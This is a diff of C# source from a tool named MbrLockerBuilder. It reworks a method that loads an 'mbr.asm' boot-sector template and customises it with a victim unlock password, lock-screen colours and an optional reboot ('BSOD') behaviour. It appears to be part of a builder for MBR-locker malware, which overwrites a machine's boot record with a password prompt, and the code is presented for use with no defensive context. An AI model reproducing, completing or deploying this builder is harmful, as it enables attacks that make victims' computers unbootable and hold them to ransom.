@@ -361,111 +361,112 @@ namespace MbrLockerBuilder
         }
 
         private string GenerateMBR()
+{
+    // ЧИТАЕМ mbr.asm ИЗ РЕСУРСОВ
+    string template = "";
+    try
+    {
+        string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+        foreach (string name in allResources)
         {
-            // ЧИТАЕМ mbr.asm ИЗ РЕСУРСОВ
-            string template = "";
-            try
+            if (name.IndexOf("mbr.asm", StringComparison.OrdinalIgnoreCase) >= 0)
             {
-                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
-                foreach (string name in allResources)
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                 {
-                    if (name.IndexOf("mbr.asm", StringComparison.OrdinalIgnoreCase) >= 0)
+                    if (stream != null)
                     {
-                        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
+                        using (StreamReader reader = new StreamReader(stream))
                         {
-                            if (stream != null)
-                            {
-                                using (StreamReader reader = new StreamReader(stream))
-                                {
-                                    template = reader.ReadToEnd();
-                                }
-                            }
+                            template = reader.ReadToEnd();
                         }
-                        break;
                     }
                 }
+                break;
             }
-            catch { }
-
-            // ЕСЛИ НЕ НАШЛИ В РЕСУРСАХ — ЧИТАЕМ ИЗ ЛОКАЛЬНОЙ ПАПКИ
-            if (string.IsNullOrEmpty(template))
-            {
-                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "mbr.asm");
-                if (File.Exists(localPath))
-                {
-                    template = File.ReadAllText(localPath);
-                }
-                else
-                {
-                    MessageBox.Show("mbr.asm не найден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return "";
-                }
-            }
-
-            // ЗАМЕНЯЕМ ПАРОЛЬ
-            string password = this.txtPassword.Text.Trim();
-            if (string.IsNullOrEmpty(password)) password = "admin";
-
-            string passwordHex;
-            if (ContainsRussian(password))
-            {
-                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
-                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
-            }
-            else
-            {
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
-            }
-
-            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
-
-            // ЗАМЕНЯЕМ ЦВЕТА (если в mbr.asm есть COLOR_BG и COLOR_FG)
-            string textColor = "07";
-            switch (this.cmbTextColor.SelectedIndex)
-            {
-                case 0: textColor = "00"; break;
-                case 1: textColor = "01"; break;
-                case 2: textColor = "02"; break;
-                case 3: textColor = "03"; break;
-                case 4: textColor = "04"; break;
-                case 5: textColor = "05"; break;
-                case 6: textColor = "06"; break;
-                case 7: textColor = "07"; break;
-                case 8: textColor = "08"; break;
-                case 9: textColor = "09"; break;
-                case 10: textColor = "0A"; break;
-                case 11: textColor = "0B"; break;
-                case 12: textColor = "0C"; break;
-                case 13: textColor = "0D"; break;
-                case 14: textColor = "0E"; break;
-                case 15: textColor = "0F"; break;
-            }
-
-            string bgColor = "00";
-            switch (this.cmbBgColor.SelectedIndex)
-            {
-                case 0: bgColor = "00"; break;
-                case 1: bgColor = "10"; break;
-                case 2: bgColor = "20"; break;
-                case 3: bgColor = "30"; break;
-                case 4: bgColor = "40"; break;
-                case 5: bgColor = "50"; break;
-                case 6: bgColor = "60"; break;
-                case 7: bgColor = "70"; break;
-            }
-
-            template = template.Replace("COLOR_BG", bgColor);
-            template = template.Replace("COLOR_FG", textColor);
-
-            bool enableBSOD = this.chkBSOD.Checked;
-            if (enableBSOD)
-            {
-                template = template.Replace("jmp hang", "int 0x19");
-            }
-
-            return template;
         }
+    }
+    catch { }
+
+    if (string.IsNullOrEmpty(template))
+    {
+        string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "mbr.asm");
+        if (File.Exists(localPath))
+        {
+            template = File.ReadAllText(localPath);
+        }
+        else
+        {
+            MessageBox.Show("mbr.asm не найден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            return "";
+        }
+    }
+
+    // ЗАМЕНЯЕМ ПАРОЛЬ
+    string password = this.txtPassword.Text.Trim();
+    if (string.IsNullOrEmpty(password)) password = "admin";
+
+    string passwordHex;
+    if (ContainsRussian(password))
+    {
+        string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+        if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+    }
+    else
+    {
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+    }
+
+    template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+
+    // ЗАМЕНЯЕМ ЦВЕТА
+    string textColor = "07";
+    switch (this.cmbTextColor.SelectedIndex)
+    {
+        case 0: textColor = "00"; break;
+        case 1: textColor = "01"; break;
+        case 2: textColor = "02"; break;
+        case 3: textColor = "03"; break;
+        case 4: textColor = "04"; break;
+        case 5: textColor = "05"; break;
+        case 6: textColor = "06"; break;
+        case 7: textColor = "07"; break;
+        case 8: textColor = "08"; break;
+        case 9: textColor = "09"; break;
+        case 10: textColor = "0A"; break;
+        case 11: textColor = "0B"; break;
+        case 12: textColor = "0C"; break;
+        case 13: textColor = "0D"; break;
+        case 14: textColor = "0E"; break;
+        case 15: textColor = "0F"; break;
+    }
+
+    string bgColor = "00";
+    switch (this.cmbBgColor.SelectedIndex)
+    {
+        case 0: bgColor = "00"; break;
+        case 1: bgColor = "10"; break;
+        case 2: bgColor = "20"; break;
+        case 3: bgColor = "30"; break;
+        case 4: bgColor = "40"; break;
+        case 5: bgColor = "50"; break;
+        case 6: bgColor = "60"; break;
+        case 7: bgColor = "70"; break;
+    }
+
+    // ПРЯМАЯ ЗАМЕНА — БЕЗ ПРОБЕЛОВ И С ПРОБЕЛАМИ
+    template = template.Replace("COLOR_BG", bgColor);
+    template = template.Replace("COLOR_FG", textColor);
+
+    // BSOD
+    bool enableBSOD = this.chkBSOD.Checked;
+    if (enableBSOD)
+    {
+        template = template.Replace("jmp hang", "int 0x19");
+    }
+
+    return template;
+}
 
         private string FindResourceByPartialName(string partialName, string fileName)
         {
